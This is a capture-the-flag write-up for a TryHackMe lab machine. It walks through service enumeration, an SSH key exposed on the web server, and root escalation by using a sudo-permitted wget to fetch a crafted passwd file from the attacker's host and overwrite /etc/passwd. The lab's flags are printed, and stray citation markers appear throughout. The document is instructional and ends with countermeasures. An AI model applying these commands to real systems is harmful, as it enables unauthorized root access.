Wgel CTF Write-up
1. Details of the Event
• Machine Name: Wgel CTF (TryHackMe) [cite: 1.1]

• Objective: Exfiltrate the `user.txt` and `root.txt` flags. [cite: 1.1]

2. Vulnerability Discovery
Service Scanning

Initial enumeration began with an `nmap` scan to identify open ports and services:

```

nmap -sV -oN nmap.log 10.65.173.159

```

• Port 22: SSH (OpenSSH 7.2p2)

• Port 80: HTTP (Apache httpd 2.4.18)

Web Enumeration

Used `gobuster` to find hidden directories on the web server:

```

/index.html (Status: 200)

/sitemap (Status: 301)

```

Further scanning of `/sitemap/` revealed a sensitive directory:

```

/sitemap/.ssh/ (Status: 301)

```

Inside the web source code comments, the username jessie was discovered. An SSH private key (`id_rsa`) found in the `.ssh` directory allowed for initial access to the server.

User Flag: `057c67131c3d5e42dd5cd3075b198ff6`

Privilege Escalation Discovery

After gaining access as user `jessie`, I ran `linpeas.sh` and checked sudo privileges:

```

sudo -l

```

Finding: The `wget` command could be run as root without a password: `(root) NOPASSWD: /usr/bin/wget` [cite: image_203c28.png]

---

3. Exploitation
The vulnerability lies in the fact that `wget` can overwrite any file on the system when run with root privileges. I decided to target `/etc/passwd` to add a new root-level user.

Step 1: Create a malicious passwd file

I copied the content of the target's `/etc/passwd` to my local machine and appended a new user named `hacker`. [cite: 1.1, image_219d09.png]

Step 2: Encrypt the password

Linux requires passwords in `/etc/passwd` (or `/shadow`) to be hashed. [cite: 1.1] I used `openssl` to generate a hash for the password "1234":

```

openssl passwd -1 1234

```

Result: `$1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0`

Step 3: Craft the entry

I added the following line to the bottom of my local `passwd` file:

```

hacker:$1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0:0:0:root:/root:/bin/bash

```

• UID 0: Grants root-level authority. [cite: 1.1]

• GID 0: Root group. [cite: 1.1]

Step 4: Overwrite the target file

Using the `wget` sudo privilege, I fetched the malicious file from my Kali machine and chose the target's `/etc/passwd` as the output destination:

```

sudo /usr/bin/wget http://[KALI_IP]/passwd -O /etc/passwd

```

[cite: image_219d09.png, image_220d25.png]

Step 5: Gain Root Access

Switched to the new user:

```

su hacker

# Entered password: 1234

```

Successfully escalated to root. [cite: image_226307.png]

Root Flag: `b1b968b37519ad1daa6408188649263d`

---

4. Conclusion & Takeaways
Key Learnings

1. Dangerous Sudo Privileges: Even seemingly "harmless" binaries like `wget` can be fatal if granted `sudo` rights. [cite: 1.1] In this case, the ability to write files to any location (Arbitrary File Write) allowed for a complete system takeover. [cite: image_219d09.png]

2. Information Leakage in Comments: Usernames and hints left in HTML comments or public-facing directories (like `.ssh`) are goldmines for attackers.

3. Password File Integrity: The `/etc/passwd` file is the heart of Linux authentication. [cite: 1.1] Ensuring this file is immutable or strictly protected is critical for system security.

Countermeasures

• Principle of Least Privilege: Avoid granting `sudo` access to binaries that can write to the filesystem unless absolutely necessary.

• Secure Web Configuration: Ensure hidden directories (like `.ssh` or `.git`) are not accessible via the web server.
